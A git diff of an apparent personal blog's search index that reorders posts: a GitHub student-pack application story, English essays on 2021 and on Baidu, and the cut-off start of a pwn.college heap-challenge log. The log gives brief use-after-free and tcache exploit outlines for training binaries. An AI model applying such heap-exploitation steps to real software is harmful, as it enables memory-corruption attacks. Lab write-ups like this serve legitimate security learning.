@@ -108,6 +108,52 @@
       </categories>
   </entry>
   <entry>
+    <title>博客一周年祭</title>
+    <url>/2022/07/06/anniversary.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>其实是github学生包申请的经历。</p>
+<p><img src="/2022/07/06/anniversary/success.png"></p>
+<span id="more"></span>
+<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>最近<code>colipot</code>内测结束开始收费了，广告甚至打到了github的首页上。从yyx方面得知，如果你通过了github学生认证，就可以白嫖每月10刀的<code>copilot</code>。除此之外，对于我来说有用的学生包产品还有<code>terminus</code>和<code>educative</code>，这些东西就足以让我心动了。听他说，他只申请了两次就成功了，看上去很简单，于是我决定试一试。</p>
+<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>我从知乎上找到了一篇github申请学生包的教程，关掉了代理，复制了github520上的hosts。打开了申请链接，绑定了自己的学生邮箱，胡乱写了几句使用学生包的原因。接着github让我提供学籍证明材料，我把学信网的证明翻译成英文上传上去提交。</p>
+<p>过程行云流水，对不对？</p>
+<p>大概半分钟过后，我就收到了认证失败的邮件，说什么<code>The item you uploaded is insufficient to demonstrate your current academic status. Modifications to your photo proof might have been detected by the system. Please see suggestions.</code></p>
+<p>于是我决定用手机拍一张学信网的证明，结果仍然失败，还是一模一样的理由。手机拍的照片怎么可能修改得了嘛，这机器审核也是绝了。但我又有什么办法呢，只能一遍一遍试啊，我尝试了人脸、学信网证明、学生证，拍照和上传文件的各种组合，一共16次，都是通通秒拒。我的耐心被用光了。</p>
+<p>于是我想知道究竟是yyx欧还是我运气拉胯，就找了我的室友进行申请，结果他两次就成功了。</p>
+<p>我按照室友的摆法摆好了<strong>录取通知书、学生证和校园卡</strong>，然后用手机拍照，再通过文件上传。这个时候github提示“与你同校的申请者提供了更可信的材料，请考虑更换自己的材料”，无法上传。后来得知，我无论上传什么图片，都会有这个提示——也就是我相当于再也上传不了了！</p>
+<p>没办法，我又开了一个小号继续申请，拍了好几次，上传了好几次，仍旧是秒回<code>The item you uploaded is insufficient to demonstrate your current academic status. Modifications to your photo proof might have been detected by the system. Please see suggestions.</code>当时的我真的想重开——</p>
+<h1 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h1><p>我怒了，直接开始怼客服。我辛辛苦苦写了10分钟的ticket竟然无情的被机器人close了，以下是我的申诉：</p>
+<blockquote>
+<p>Application not approved (student)</p>
+<p>Description</p>
+<p>I’m a student from China and I use credit from <a href="https://support.github.com/ticket/personal/0/url">https://www.chsi.com.cn/</a> to prove my identity and get the student pack.<br>Unfortunately I’ve tried 8 times, the bot always returns <code>you uploaded is insufficient to demonstrate your current academic status</code> and asks me to upload <code>School issued photo ID with current enrollment date</code>. However my proof clearly shows my photo, school name and my admission time. I’ve tried several hours and I’m really confused.<br>This is a screen shot.<br>（学信网截图）<br>And this is a photo.<br>（手机拍的截图）<br>Could you please tell me the other reason besides repetitive <code>uploaded is insufficient</code> ?</p>
+</blockquote>
+<p>之后又补了一句<code>pls</code>来reopen ticket，这下终于没被关了。</p>
+<p>几天之后，我又加了一句：</p>
+<blockquote>
+<p>Now I’ve tried 16 times, providing materials including my face, school curriculum, student ID card and credit from . I believe that’s enough to prove my identity.</p>
+</blockquote>
+<p>就在7月7日，github终于有了回复：</p>
+<blockquote>
+<p>Hello,</p>
+<p>Thanks for contacting GitHub support.</p>
+<p>Please reapply using your school issued email address;</p>
+<p><a href="https://education.github.com/discount_requests/student_application">https://education.github.com/discount_requests/student_application</a></p>
+<p>If you can, let me know once that is done.</p>
+<p>Kind regards,<br> Topaz</p>
+</blockquote>
+<p>我按照它的链接点进去后，重新交了一遍带有<strong>录取通知书、学生证和校园卡</strong>的照片，大概过了两分钟，终于通过了。</p>
+<p><img src="/2022/07/06/anniversary/success.png"></p>
+<p>真的心累……</p>
+<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>首先我尝试了一下<code>copilot</code>，对于OI的c++代码来说，除了平衡树、树剖、FFT、后缀数组等又臭又长的模板跟印象中相差很大，需要适应之外，基本上80%的代码都不用写了。java方面写后端香得不要不要的，基本上写一个注释，几行代码就出来了，都不带修改的。python写pwn的exp时有点妨碍思维（毕竟创造性的东西还是难以替代的）。</p>
+<p>然后手机上的<code>terminus</code>的UI挺好看，还自带code snippets，以后打算装在电脑上，可以跟Xshell说再见了。</p>
+<p>至于<code>educative</code>，我手贱点了6个月的免费试用。结果点开一看，大多数都是编程语言、前端开发与机器学习相关的课程，一时半会儿用不上，有点后悔。为了不暴殄天物，我把帐户共享给了高中同学，至少心里感觉没那么浪费……</p>
+<p>还有<code>azure</code>,<code>name.com</code>之类的，就等以后有需求再说吧。</p>
+]]></content>
+      <categories>
+        <category>test</category>
+      </categories>
+  </entry>
+  <entry>
     <title>2048的又一次改良</title>
     <url>/2021/08/02/2048plus.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>闲来无事，我扒出了十年前在网上复制粘贴的mma2048代码，并对其进行了改良，将2048与Threes!结合起来，形成了如下代码。</p>
@@ -242,52 +288,6 @@
       </tags>
   </entry>
   <entry>
-    <title>博客一周年祭</title>
-    <url>/2022/07/06/anniversary.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>其实是github学生包申请的经历。</p>
-<p><img src="/2022/07/06/anniversary/success.png"></p>
-<span id="more"></span>
-<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>最近<code>colipot</code>内测结束开始收费了，广告甚至打到了github的首页上。从yyx方面得知，如果你通过了github学生认证，就可以白嫖每月10刀的<code>copilot</code>。除此之外，对于我来说有用的学生包产品还有<code>terminus</code>和<code>educative</code>，这些东西就足以让我心动了。听他说，他只申请了两次就成功了，看上去很简单，于是我决定试一试。</p>
-<h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>我从知乎上找到了一篇github申请学生包的教程，关掉了代理，复制了github520上的hosts。打开了申请链接，绑定了自己的学生邮箱，胡乱写了几句使用学生包的原因。接着github让我提供学籍证明材料，我把学信网的证明翻译成英文上传上去提交。</p>
-<p>过程行云流水，对不对？</p>
-<p>大概半分钟过后，我就收到了认证失败的邮件，说什么<code>The item you uploaded is insufficient to demonstrate your current academic status. Modifications to your photo proof might have been detected by the system. Please see suggestions.</code></p>
-<p>于是我决定用手机拍一张学信网的证明，结果仍然失败，还是一模一样的理由。手机拍的照片怎么可能修改得了嘛，这机器审核也是绝了。但我又有什么办法呢，只能一遍一遍试啊，我尝试了人脸、学信网证明、学生证，拍照和上传文件的各种组合，一共16次，都是通通秒拒。我的耐心被用光了。</p>
-<p>于是我想知道究竟是yyx欧还是我运气拉胯，就找了我的室友进行申请，结果他两次就成功了。</p>
-<p>我按照室友的摆法摆好了<strong>录取通知书、学生证和校园卡</strong>，然后用手机拍照，再通过文件上传。这个时候github提示“与你同校的申请者提供了更可信的材料，请考虑更换自己的材料”，无法上传。后来得知，我无论上传什么图片，都会有这个提示——也就是我相当于再也上传不了了！</p>
-<p>没办法，我又开了一个小号继续申请，拍了好几次，上传了好几次，仍旧是秒回<code>The item you uploaded is insufficient to demonstrate your current academic status. Modifications to your photo proof might have been detected by the system. Please see suggestions.</code>当时的我真的想重开——</p>
-<h1 id="转机"><a href="#转机" class="headerlink" title="转机"></a>转机</h1><p>我怒了，直接开始怼客服。我辛辛苦苦写了10分钟的ticket竟然无情的被机器人close了，以下是我的申诉：</p>
-<blockquote>
-<p>Application not approved (student)</p>
-<p>Description</p>
-<p>I’m a student from China and I use credit from <a href="https://support.github.com/ticket/personal/0/url">https://www.chsi.com.cn/</a> to prove my identity and get the student pack.<br>Unfortunately I’ve tried 8 times, the bot always returns <code>you uploaded is insufficient to demonstrate your current academic status</code> and asks me to upload <code>School issued photo ID with current enrollment date</code>. However my proof clearly shows my photo, school name and my admission time. I’ve tried several hours and I’m really confused.<br>This is a screen shot.<br>（学信网截图）<br>And this is a photo.<br>（手机拍的截图）<br>Could you please tell me the other reason besides repetitive <code>uploaded is insufficient</code> ?</p>
-</blockquote>
-<p>之后又补了一句<code>pls</code>来reopen ticket，这下终于没被关了。</p>
-<p>几天之后，我又加了一句：</p>
-<blockquote>
-<p>Now I’ve tried 16 times, providing materials including my face, school curriculum, student ID card and credit from . I believe that’s enough to prove my identity.</p>
-</blockquote>
-<p>就在7月7日，github终于有了回复：</p>
-<blockquote>
-<p>Hello,</p>
-<p>Thanks for contacting GitHub support.</p>
-<p>Please reapply using your school issued email address;</p>
-<p><a href="https://education.github.com/discount_requests/student_application">https://education.github.com/discount_requests/student_application</a></p>
-<p>If you can, let me know once that is done.</p>
-<p>Kind regards,<br> Topaz</p>
-</blockquote>
-<p>我按照它的链接点进去后，重新交了一遍带有<strong>录取通知书、学生证和校园卡</strong>的照片，大概过了两分钟，终于通过了。</p>
-<p><img src="/2022/07/06/anniversary/success.png"></p>
-<p>真的心累……</p>
-<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>首先我尝试了一下<code>copilot</code>，对于OI的c++代码来说，除了平衡树、树剖、FFT、后缀数组等又臭又长的模板跟印象中相差很大，需要适应之外，基本上80%的代码都不用写了。java方面写后端香得不要不要的，基本上写一个注释，几行代码就出来了，都不带修改的。python写pwn的exp时有点妨碍思维（毕竟创造性的东西还是难以替代的）。</p>
-<p>然后手机上的<code>terminus</code>的UI挺好看，还自带code snippets，以后打算装在电脑上，可以跟Xshell说再见了。</p>
-<p>至于<code>educative</code>，我手贱点了6个月的免费试用。结果点开一看，大多数都是编程语言、前端开发与机器学习相关的课程，一时半会儿用不上，有点后悔。为了不暴殄天物，我把帐户共享给了高中同学，至少心里感觉没那么浪费……</p>
-<p>还有<code>azure</code>,<code>name.com</code>之类的，就等以后有需求再说吧。</p>
-]]></content>
-      <categories>
-        <category>test</category>
-      </categories>
-  </entry>
-  <entry>
     <title>Twenty-two——bewilderment</title>
     <url>/2021/11/01/bewilderment.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote>
@@ -320,6 +320,73 @@
 <p>So please cherish the last year of your senior high. It’s truly the purest time of your whole life.</p>
 <p><strong>Another thing is the distance between my dream and the reality.</strong> I’m very suitable for my current profession because I’m skilled in math, English and programming. Also, I’m satisfied with my current place and my family are proud of me. However, the path to my dream becomes more and more blurred and my avarice for money (I believe a high salary is waiting for me) prevents me from achieving it. Maybe in the rest of my life I could only daydream it, which makes me feel gloomy with a bit of melancholy.</p>
 <p>Lastly, I sincerely congratulate her and hope her could achieve the dream. After all, unlike olympiad which tests agility and cleverness, learning serious math requires very tough work, at least 10 times harder than my profession. I also hope myself could get out of the woods and reach a new altitude. At that time, maybe I will find the way to my dream again.</p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Twenty-four——my summary of year 2021</title>
+    <url>/2021/12/30/bye2021.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>The year 2021 is another extraordinary year for me. Many shining and gloomy moments happened. To sum up, I still believe my year of 2021 goes smoothly.</p>
+<p><img src="/2021/12/30/bye2021/2021.png"></p>
+<span id="more"></span> 
+<p>The year of 2021 started with disappointment of AFO and frustration of failing in the monthly examination. I knew this was a crux of my life because there were only 5 months left before gaokao but I still had a bunch of things to master. My goal was to reach 600, and I had to prepare for OI, CTF for self-enrollment exam, attend classes and review those unfamiliar knowledge before simultaneously. It’s a very tough work, like walking in the darkness while looking for the correct path myself. The only joyful thing in my “senior 3” was playing table-tennis and taking photos in snowy days after the academic proficiency test ended.</p>
+<p>In winter vacation, to help go through courses I’ve learnt and forgotten in senior 1, I asked my parents to find “one to one” tutoring for my physics and chemistry. Surely I recovered what I learned before and I’ve got a lot of practical skills for exam, but more importantly, my physics tutor told me the prospect of computer science and asked me to work hard on it. I was motivated by him and put more attention to self-enrollment.</p>
+<p>By the end of March, my hard work in CTF has paid off and I succeeded in self-enrollment exam by scu. It’s the first and huge progress I’ve made this year. After the exam, my task became much simpler. I just need to focus on gaokao and got a high score instead.</p>
+<p>Time passed quickly and gaokao finally arrived in a glimpse. Although the difficulty of natural science has raised, I still got a fairly high score in math. However, I messed up in physics and chemistry, which made the overall score just a little more than 600. There were some classmates attending gaokao <strong>in senior 2 with me</strong> and the best score was about 670, but I don’t care. All in all, 605 is still a highlight for student who only takes classes for about one year. </p>
+<blockquote>
+<p>After gaokao, my mother told me that she was diagnosed with lung cancer when I was having a self-enrollment. But luckily, it was an early stage and can be cured by an operation. Also, she had an insurance and got paid a lot of money, which was far more than the fare of operation. Say, this was the unexpected fortune. What depressed my family was she indulged in <del>investment</del> lottery and took no notice of my advice of quitting. When she realized this was a fraud, she had lost all of the “unexpected fortune”.</p>
+</blockquote>
+<p>The life in summer vacation wasn’t as easy as I thought before. I had to learn calculus, linear algebra and got a driving license in only 2 months. I couldn’t imagine how I managed to handle these but I still worked them out. Also, I played <em>Mystery Lover</em> recommended by Hash and developed an interest in Touhou (although I don’t plan to play the game because it’s too time-consuming), yandere (like Yuno) and music games. These games, anime and music took me into another idealized world apart from the cruel reality. Say, another habitat for my heart.</p>
+<p>By the time I entered university, I firstly felt all the surroundings are fresh and we have plenty of time to what I want. Then I realized that self-control is impressively significant in campus life now, which can make you distinctive or degenerate. So I continued to learn with the strength of senior high. Then in a CTF competition nationwide, we ranked 4th in 24 participants, winning the glory of our university <del>and high school</del>.</p>
+<p>However in the mid-term exam, I didn’t do a very good job in calculus, just a little more than 60 again. Also, the freshness of campus life has vanished, I gradually found that there are many unnecessary tasks you have to do and boresome courses you have to take. That made me kind of annoyed. Sometimes I even doubted if the path I chose is my dream and lost in thought. </p>
+<blockquote>
+<p>To seek the meaning of my campus life and look for way to achieve my dream, I watched <em>CLANNAD</em> and also played the game. Although I didn’t find the answer to my current situation, I truly felt a different kind of warmth. I was moved by the grand redefinition of “FAMILY” and the growth and maturity of Okazaki couple. Till now, the plots and scenarios still reverberate in my heart.</p>
+</blockquote>
+<p>When the security project comes in late November and December, some classmates asked me questions about pointers, stack overflow and reverse engineering. So, I posted some blogs, trying to explain these knowledge in a friendly way. While teaching others, I also have a deeper understanding of these principle by manipulating over and over again. And step by step I’ve felt the charm of my major and I’m not as bewildered as before. So I’m starting to learn <em>CSAPP</em> and <em>encryption and decryption</em> on my own during spare time to enrich my academic ability.</p>
+<p>Hoping I will get good grades in calculus and linear algebra, and learn more practical skills in the next year 2022!  </p>
+]]></content>
+      <categories>
+        <category>随笔</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>twenty-five——bye, Baidu</title>
+    <url>/2022/04/15/bye_baidu.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>My English presentation on 4/14/2022.</p>
+<p><img src="/2022/04/15/bye_baidu/1.png"></p>
+<span id="more"></span>
+<p><img src="/2022/04/15/bye_baidu/2.png"></p>
+<p>Baidu, the largest search engine provider in China, was found in millennium. Owing to deep understanding of habits from native users, Baidu beat its opponent Google successfully. What’s more, deeply integrated with other services, such as Baidu Encyclopedia, Baidu Post Bar, Baidu Knows, Baidu Netdisk, Baidu improved user stickiness. In recent years, with the development of mobile-tech, Baidu created a column named Baijiahao. Through using mobile apps, Baidu gains a lot of user traffic, while making much profit.</p>
+<p><img src="/2022/04/15/bye_baidu/3.png"></p>
+<p><img src="/2022/04/15/bye_baidu/4.png"></p>
+<p>The first reason to refuse Baidu is that there are too much distraction. One of the most obvious factors is the advertisement. Look at this picture, when you input keywords relating to “diseases”, “education” or goods”, Baidu will return a whole page of noisome ads, which wastes your time. Moreover, some fake ads may mislead you and cause some loss.</p>
+<p><img src="/2022/04/15/bye_baidu/5.png"></p>
+<p>Apart from disgusting ads, the search result pages of Baidu are too complex. There are too many unnecessary items. For example, when you type “games” in Baidu, the recommendation on the right is so vulgar that they can’t even be called as “games”.</p>
+<p><img src="/2022/04/15/bye_baidu/6.png"></p>
+<p>The profusion of webpage is also the nightmare of minimalists. This is a new tab from my browser. Looks very simple, huh?</p>
+<p><img src="/2022/04/15/bye_baidu/7.png"></p>
+<p>This is Google. It’s also very suitable for minimalists.</p>
+<p><img src="/2022/04/15/bye_baidu/8.png"></p>
+<p>This is Bing. It looks beautiful and even better.</p>
+<p><img src="/2022/04/15/bye_baidu/9.png"></p>
+<p>And this is Baidu… Most of the time, if you click one of these links, you’ll watch videos or read news one after another——and after half or one hour later, you will return to the start and totally forget what you want to search in the beginning.</p>
+<p><img src="/2022/04/15/bye_baidu/10.png"></p>
+<p>The second reason is useless search result for some keywords. Baidu only takes root in the Chinese market, so it’s unsuitable to search items that are heavily associated with English. </p>
+<p><img src="/2022/04/15/bye_baidu/11.png"></p>
+<p>In professional fields, like mathematics, when you type “de rham cohomology”, you can get a link to Wikipedia. However in Baidu, the first search result is just the Chinese translation. I believe people who search this are eager to find its definition and explanation, not just the Chinese translation.</p>
+<p><img src="/2022/04/15/bye_baidu/12.png"></p>
+<p><img src="/2022/04/15/bye_baidu/13.png"></p>
+<p>My roommate is a sports fan and he often follows sports stars’ activities. Baidu lacks information of foreign culture like sports. When he tried to look up “juju” in Google, it returns his Instagram, wiki and so on. On the other side, he typed the same word in Baidu, he can only receive a female Japanese singer and other unrelated info.</p>
+<p><img src="/2022/04/15/bye_baidu/14.png"></p>
+<p><img src="/2022/04/15/bye_baidu/15.png"></p>
+<p>Another reason not to be ignored is its vile business model. If you use your mobile browser to search in Baidu.com, or click other related searches, you’ll receive a pop-up which asks to download their app. This action degrades the user experience and makes some mobile users reluctantly install Baidu app——of course not including me.</p>
+<p>Another solid proof is the speed restriction policy of Baidu Netdisk. At the beginning when Baidu Netdisk was found, it generously gives users 2048 gigabytes of disk space. Actually this is a good scheme to accumulate users. When there are enough (i.e. pretty much) users, Baidu starts to restrict the download speed and asks users to upgrade VIP in order to speed up. Because users have already store lots of data, they can’t find any substitute. As a result, they have to pay for Baidu to retrieve their important data.</p>
+<p><img src="/2022/04/15/bye_baidu/16.png"></p>
+<p>It must be said that Baidu still has some advantages. Due to the lack of copyright awareness in Mainland China, you can still find lots of pirated software in Baidu. By the way, it’s also a good choice to look for pornography in Baidu.</p>
+<p>All in all, as college students, to save time and find more refined information, let’s say “goodbye” to Baidu and user other search engines together. Thanks for your listening!</p>
+<p><img src="/2022/04/15/bye_baidu/17.png"></p>
 ]]></content>
       <categories>
         <category>随笔</category>
@@ -521,73 +588,6 @@
       <tags>
         <tag>python</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>twenty-five——bye, Baidu</title>
-    <url>/2022/04/15/bye_baidu.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>My English presentation on 4/14/2022.</p>
-<p><img src="/2022/04/15/bye_baidu/1.png"></p>
-<span id="more"></span>
-<p><img src="/2022/04/15/bye_baidu/2.png"></p>
-<p>Baidu, the largest search engine provider in China, was found in millennium. Owing to deep understanding of habits from native users, Baidu beat its opponent Google successfully. What’s more, deeply integrated with other services, such as Baidu Encyclopedia, Baidu Post Bar, Baidu Knows, Baidu Netdisk, Baidu improved user stickiness. In recent years, with the development of mobile-tech, Baidu created a column named Baijiahao. Through using mobile apps, Baidu gains a lot of user traffic, while making much profit.</p>
-<p><img src="/2022/04/15/bye_baidu/3.png"></p>
-<p><img src="/2022/04/15/bye_baidu/4.png"></p>
-<p>The first reason to refuse Baidu is that there are too much distraction. One of the most obvious factors is the advertisement. Look at this picture, when you input keywords relating to “diseases”, “education” or goods”, Baidu will return a whole page of noisome ads, which wastes your time. Moreover, some fake ads may mislead you and cause some loss.</p>
-<p><img src="/2022/04/15/bye_baidu/5.png"></p>
-<p>Apart from disgusting ads, the search result pages of Baidu are too complex. There are too many unnecessary items. For example, when you type “games” in Baidu, the recommendation on the right is so vulgar that they can’t even be called as “games”.</p>
-<p><img src="/2022/04/15/bye_baidu/6.png"></p>
-<p>The profusion of webpage is also the nightmare of minimalists. This is a new tab from my browser. Looks very simple, huh?</p>
-<p><img src="/2022/04/15/bye_baidu/7.png"></p>
-<p>This is Google. It’s also very suitable for minimalists.</p>
-<p><img src="/2022/04/15/bye_baidu/8.png"></p>
-<p>This is Bing. It looks beautiful and even better.</p>
-<p><img src="/2022/04/15/bye_baidu/9.png"></p>
-<p>And this is Baidu… Most of the time, if you click one of these links, you’ll watch videos or read news one after another——and after half or one hour later, you will return to the start and totally forget what you want to search in the beginning.</p>
-<p><img src="/2022/04/15/bye_baidu/10.png"></p>
-<p>The second reason is useless search result for some keywords. Baidu only takes root in the Chinese market, so it’s unsuitable to search items that are heavily associated with English. </p>
-<p><img src="/2022/04/15/bye_baidu/11.png"></p>
-<p>In professional fields, like mathematics, when you type “de rham cohomology”, you can get a link to Wikipedia. However in Baidu, the first search result is just the Chinese translation. I believe people who search this are eager to find its definition and explanation, not just the Chinese translation.</p>
-<p><img src="/2022/04/15/bye_baidu/12.png"></p>
-<p><img src="/2022/04/15/bye_baidu/13.png"></p>
-<p>My roommate is a sports fan and he often follows sports stars’ activities. Baidu lacks information of foreign culture like sports. When he tried to look up “juju” in Google, it returns his Instagram, wiki and so on. On the other side, he typed the same word in Baidu, he can only receive a female Japanese singer and other unrelated info.</p>
-<p><img src="/2022/04/15/bye_baidu/14.png"></p>
-<p><img src="/2022/04/15/bye_baidu/15.png"></p>
-<p>Another reason not to be ignored is its vile business model. If you use your mobile browser to search in Baidu.com, or click other related searches, you’ll receive a pop-up which asks to download their app. This action degrades the user experience and makes some mobile users reluctantly install Baidu app——of course not including me.</p>
-<p>Another solid proof is the speed restriction policy of Baidu Netdisk. At the beginning when Baidu Netdisk was found, it generously gives users 2048 gigabytes of disk space. Actually this is a good scheme to accumulate users. When there are enough (i.e. pretty much) users, Baidu starts to restrict the download speed and asks users to upgrade VIP in order to speed up. Because users have already store lots of data, they can’t find any substitute. As a result, they have to pay for Baidu to retrieve their important data.</p>
-<p><img src="/2022/04/15/bye_baidu/16.png"></p>
-<p>It must be said that Baidu still has some advantages. Due to the lack of copyright awareness in Mainland China, you can still find lots of pirated software in Baidu. By the way, it’s also a good choice to look for pornography in Baidu.</p>
-<p>All in all, as college students, to save time and find more refined information, let’s say “goodbye” to Baidu and user other search engines together. Thanks for your listening!</p>
-<p><img src="/2022/04/15/bye_baidu/17.png"></p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>Twenty-four——my summary of year 2021</title>
-    <url>/2021/12/30/bye2021.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>The year 2021 is another extraordinary year for me. Many shining and gloomy moments happened. To sum up, I still believe my year of 2021 goes smoothly.</p>
-<p><img src="/2021/12/30/bye2021/2021.png"></p>
-<span id="more"></span> 
-<p>The year of 2021 started with disappointment of AFO and frustration of failing in the monthly examination. I knew this was a crux of my life because there were only 5 months left before gaokao but I still had a bunch of things to master. My goal was to reach 600, and I had to prepare for OI, CTF for self-enrollment exam, attend classes and review those unfamiliar knowledge before simultaneously. It’s a very tough work, like walking in the darkness while looking for the correct path myself. The only joyful thing in my “senior 3” was playing table-tennis and taking photos in snowy days after the academic proficiency test ended.</p>
-<p>In winter vacation, to help go through courses I’ve learnt and forgotten in senior 1, I asked my parents to find “one to one” tutoring for my physics and chemistry. Surely I recovered what I learned before and I’ve got a lot of practical skills for exam, but more importantly, my physics tutor told me the prospect of computer science and asked me to work hard on it. I was motivated by him and put more attention to self-enrollment.</p>
-<p>By the end of March, my hard work in CTF has paid off and I succeeded in self-enrollment exam by scu. It’s the first and huge progress I’ve made this year. After the exam, my task became much simpler. I just need to focus on gaokao and got a high score instead.</p>
-<p>Time passed quickly and gaokao finally arrived in a glimpse. Although the difficulty of natural science has raised, I still got a fairly high score in math. However, I messed up in physics and chemistry, which made the overall score just a little more than 600. There were some classmates attending gaokao <strong>in senior 2 with me</strong> and the best score was about 670, but I don’t care. All in all, 605 is still a highlight for student who only takes classes for about one year. </p>
-<blockquote>
-<p>After gaokao, my mother told me that she was diagnosed with lung cancer when I was having a self-enrollment. But luckily, it was an early stage and can be cured by an operation. Also, she had an insurance and got paid a lot of money, which was far more than the fare of operation. Say, this was the unexpected fortune. What depressed my family was she indulged in <del>investment</del> lottery and took no notice of my advice of quitting. When she realized this was a fraud, she had lost all of the “unexpected fortune”.</p>
-</blockquote>
-<p>The life in summer vacation wasn’t as easy as I thought before. I had to learn calculus, linear algebra and got a driving license in only 2 months. I couldn’t imagine how I managed to handle these but I still worked them out. Also, I played <em>Mystery Lover</em> recommended by Hash and developed an interest in Touhou (although I don’t plan to play the game because it’s too time-consuming), yandere (like Yuno) and music games. These games, anime and music took me into another idealized world apart from the cruel reality. Say, another habitat for my heart.</p>
-<p>By the time I entered university, I firstly felt all the surroundings are fresh and we have plenty of time to what I want. Then I realized that self-control is impressively significant in campus life now, which can make you distinctive or degenerate. So I continued to learn with the strength of senior high. Then in a CTF competition nationwide, we ranked 4th in 24 participants, winning the glory of our university <del>and high school</del>.</p>
-<p>However in the mid-term exam, I didn’t do a very good job in calculus, just a little more than 60 again. Also, the freshness of campus life has vanished, I gradually found that there are many unnecessary tasks you have to do and boresome courses you have to take. That made me kind of annoyed. Sometimes I even doubted if the path I chose is my dream and lost in thought. </p>
-<blockquote>
-<p>To seek the meaning of my campus life and look for way to achieve my dream, I watched <em>CLANNAD</em> and also played the game. Although I didn’t find the answer to my current situation, I truly felt a different kind of warmth. I was moved by the grand redefinition of “FAMILY” and the growth and maturity of Okazaki couple. Till now, the plots and scenarios still reverberate in my heart.</p>
-</blockquote>
-<p>When the security project comes in late November and December, some classmates asked me questions about pointers, stack overflow and reverse engineering. So, I posted some blogs, trying to explain these knowledge in a friendly way. While teaching others, I also have a deeper understanding of these principle by manipulating over and over again. And step by step I’ve felt the charm of my major and I’m not as bewildered as before. So I’m starting to learn <em>CSAPP</em> and <em>encryption and decryption</em> on my own during spare time to enrich my academic ability.</p>
-<p>Hoping I will get good grades in calculus and linear algebra, and learn more practical skills in the next year 2022!  </p>
-]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
   </entry>
   <entry>
     <title>Twenty-three——review of CLANNAD (anime)</title>
@@ -1630,36 +1630,6 @@
       </tags>
   </entry>
   <entry>
-    <title>pwncollege之堆通关记录</title>
-    <url>/2022/07/03/pwn_college_heap.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>指 <a href="https://dojo.pwn.college/challenges">https://dojo.pwn.college/challenges</a> 中的<code>Dynamic Allocator Misuse</code>部分。</p>
-<span id="more"></span>
-<h2 id="babyheap1-0-2-1——uaf"><a href="#babyheap1-0-2-1——uaf" class="headerlink" title="babyheap1.0~2.1——uaf"></a>babyheap1.0~2.1——uaf</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(flag_size)</span><br><span class="line">   free()</span><br><span class="line">   read_flag()</span><br><span class="line">   puts()</span><br></pre></td></tr></table></figure>
-<h2 id="babyheap3-0-3-1——uaf2-0"><a href="#babyheap3-0-3-1——uaf2-0" class="headerlink" title="babyheap3.0~3.1——uaf2.0"></a>babyheap3.0~3.1——uaf2.0</h2><p>注意tcache是LIFO结构</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">   malloc(<span class="number">0</span>, flag_size)</span><br><span class="line">   malloc(<span class="number">1</span>, flag_size)</span><br><span class="line">   free(<span class="number">1</span>)</span><br><span class="line">   free(<span class="number">0</span>)</span><br><span class="line">   read_flag()</span><br><span class="line">   puts(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="babyheap4-0-amp-4-1——tcache-double-free"><a href="#babyheap4-0-amp-4-1——tcache-double-free" class="headerlink" title="babyheap4.0&amp;4.1——tcache double free"></a>babyheap4.0&amp;4.1——tcache double free</h2><p>第一次独立写出堆题，虽然是最简单的那种<code>tcache double free</code>。</p>
